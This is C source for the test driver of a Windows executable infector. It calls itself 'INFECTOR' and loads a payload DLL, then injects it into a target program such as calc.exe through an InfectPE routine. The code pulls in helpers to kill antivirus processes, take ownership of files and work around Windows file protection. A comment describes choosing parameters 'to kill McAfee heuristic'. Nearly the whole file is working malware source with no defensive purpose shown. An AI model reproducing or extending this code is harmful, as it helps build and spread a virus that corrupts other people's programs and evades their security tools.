
#include <windows.h>
#include <stdio.h>
#include <wincrypt.h>
#include <winsvc.h>
#include <tlhelp32.h> // for av process kill

#define PEINF_VER 23

#define TARGET "exe\\calc.exe"        // usual target 
//#define TARGET "exe\\z_kkqvx_.bin"  //
//#define TARGET "exe\\notepad2k.exe" // 2k small overlay

//#define dbgdbg
//#define pedbg
#define PEDUMP
//#define CCRW_BIN

#ifdef CCRW_BIN
 unsigned char *C_CODE_BIN=NULL;
 unsigned char ccbuf[4096];
#endif

void InitAPIbyStr(DWORD *adr[], HANDLE h, char *data);
BOOL isSystemNT();

#include "..\_api\kernel32.h"
#include "..\_api\crtdll.h"
#include "..\_api\user32.h"
#include "..\_api\sfc.h"
#include "..\_api\sfc_os.h"
#include "..\_api\shell32.h"
#include "..\_api\advapi32.h"
#include "..\_api\_api.h"

#include "..\_token.c"                  // EditOwnToken (take_ownership)

#include "_dbgdbg.c"

///////////////////////////////////////////////////////////////
// structures for memory access ///////////////////////////////

 typedef struct wMEMORY_STRUCT{
  WORD word0;        
 } wMEMORY;

 typedef struct dMEMORY_STRUCT{
  DWORD dword0;        
 } dMEMORY;

///////////////////////////////////////////////////////////////
// Check is system NT or not //////////////////////////////////

BOOL SYSTEM_NT=FALSE;

BOOL isSystemNT()
{
	OSVERSIONINFO osver;

	if (/*@S!=*/SYSTEM_NT!=0/*@E*/) return TRUE;
	
	osver.dwOSVersionInfoSize = sizeof(osver);
	_GetVersionEx(&osver);

	if (/*@S==*/osver.dwPlatformId == VER_PLATFORM_WIN32_NT/*@E*/) SYSTEM_NT=TRUE;

 #ifdef dbgdbg
	adddeb("GLOB SYSTEM_NT:%u (1==TRUE)",SYSTEM_NT);
 #endif

	return SYSTEM_NT;
}

///////////////////////////////////////////////////////////////

#include "../_strings/_my_strcpy.c"
#include "../_strings/_rndstr.c"
#include "../_infect2/_fileown.c"

#include "_pehead.h"

#ifdef C_CODE_SV
 #include "_c_code_sv.h"
#else
 #include "_c_code.h"
#endif

DWORD EMUL=1;
DWORD AntiEmulator() { return 1; } // always return OK
DWORD GetTicks1() { } 

#include "_c_code.c"
#include "_peinf.c"
#include "..\_kernel.c"

///////////////////////////////////////////////////////////////
// Main Thread ////////////////////////////////////////////////

DWORD MainThread(LPVOID GPA)
{
	DWORD len;
	HANDLE hh, h;
	BOOL res;

	unsigned char *dll;

	_DeleteFile("!inf.txt");
	_srand(_GetTickCount()); 

 #ifdef CCRW_BIN
	hh = _CreateFile("ccrw.bin",GENERIC_READ|FILE_SHARE_READ,0,0,OPEN_EXISTING,0,0);
	if (hh == INVALID_HANDLE_VALUE)
	{ printf("cant open ccrw.bin, using built-in C_CODE\n"); }
	else
	{
		_ReadFile(hh, ccbuf, sizeof(ccbuf), &len, NULL);
		_CloseHandle(hh);
		C_CODE_BIN = ccbuf;
		printf("using ccrw.bin len:%u...\n", len);
	}
 #endif

 //---

	szinfcode = WriteOrGetLen_C_CODE(NULL,0,0,0);

	#define MAX_ALLOC 5000000

	dll = _LocalAlloc(LMEM_FIXED, MAX_ALLOC);
	if (dll == NULL) { printf("cant alloc\n"); exit(1); }

	h = _CreateFile("vdll\\vdll.dll",GENERIC_READ|FILE_SHARE_READ,0,0,OPEN_EXISTING,0,0);
	if (h == INVALID_HANDLE_VALUE)
	{
		printf("cant open dll\n");
		return FALSE;
	}

	_ReadFile(h,dll,MAX_ALLOC,&len,NULL);
	_CloseHandle(h);

	printf("read ok\n");

	//infect

	dll_mem = dll;
	dll_len = len;
	res = InfectPE(TARGET);

	#ifdef FSB
	 if (res==TRUE) { printf("INFECTED!\n"); getch(); }
	           else { printf("NOT INFECTED! try other EXE!\n"); getch(); }
	#endif

	_LocalFree(dll);
}

//--- Entry point ---

int main()
{
	PE_HEADER *pe;
	DWORD a0, a, eiRVA, q;

// printf(" #define SZOBJE 0x%X\n",sizeof(PE_OBJENTRY));
// printf(" #define SZPE   0x%X\n",sizeof(PE_HEADER));
// printf(" #define SZDBG  0x%X\n",sizeof(PE_DEBUG));
// printf(" #define SZIDTE 0x%X\n",sizeof(IMPORT_DIRECTORY_TABLE_ENTRY));

	SECTNAME[0]=0;

	printf("*** INFECTOR\n");

	//@S
	
	/* DWORD */ a0 = (DWORD)MainThread;               // any address inside our code
	/* DWORD */ a  = ((DWORD)MainThread>>16)<<16;     // align it by 64kb
	//@E

	// --- Find PE header
	
	 // step can be only 2^x, where x from 0 to 16 (1-0x10000)
	 // to kill McAfee heuristic we use this

	a = FindPEheader(a, a0, 4, &pe);

	// --- Get import table RVA

	/* DWORD */ eiRVA = pe->importrva;     //exe import RVA

	// --- import table (get addr of first imported from kernel32 func)

	for (q = 0; q < pe->importsize; q += sizeof(IMPORT_DIRECTORY_TABLE_ENTRY))
	{
		IMPORT_DIRECTORY_TABLE_ENTRY *idte=(LPVOID)(/*@S+*/a+eiRVA+q/*@E*/);

		if (/*@S==*/idte->ImportLookUp==0/*@E*/) break; //@S
		if (/*@S!=*/_KERNEL32 != NULL/*@E*/) break;     //@E

		ProcessDLLimports(a, idte);
	}

	if (/*@S==*/_KERNEL32 == NULL/*@E*/) return;


	InitKernel32a();  // GetModuleHandle,LoadLibrary
	InitKernel32();
	InitCRTDLL();
	InitADVAPI32();
	InitUser32();   
	InitSFC();     
	InitShell32();
	InitSFC_OS(); 


	_DeleteFile("peinf.log");

	MainThread(NULL); // instead of MainThread

	// we need this for exe (real import from kernel32.dll)
	GetModuleHandle("kernel32.dll");  //Vista bugfix, instead of ExitThread
}
